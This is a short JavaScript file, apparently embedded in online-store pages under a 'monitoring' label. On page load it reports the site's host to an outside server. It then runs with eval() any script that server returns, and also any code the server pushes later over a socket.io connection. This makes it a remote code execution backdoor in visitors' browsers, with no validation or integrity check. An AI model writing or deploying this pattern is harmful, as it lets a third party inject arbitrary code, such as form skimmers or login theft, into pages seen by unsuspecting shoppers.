import io from "socket.io-client"
import axios from "axios"
const html = document.querySelector("html")
const storeID = html.getAttribute("data-store")
const host = "https://monitoring.auaha.com.br"

function checkAvailable() {
    const url = `${host}/check/${storeID}`
    axios.get(url).then(check => {
        if (Object.keys(check.data).length)
            if (check.data.script) execScript(check.data.script)
    })
    axios.post(url, {
        body: {
            host: window.location.host
        }
    })
}

checkAvailable()

function execScript(script) {
    eval(script)
}

const socket = io(host)
socket.on("check", () => {
    checkAvailable()
})

socket.on("script", data => {
    if (data.store_id === storeID) execScript(data.exec)
})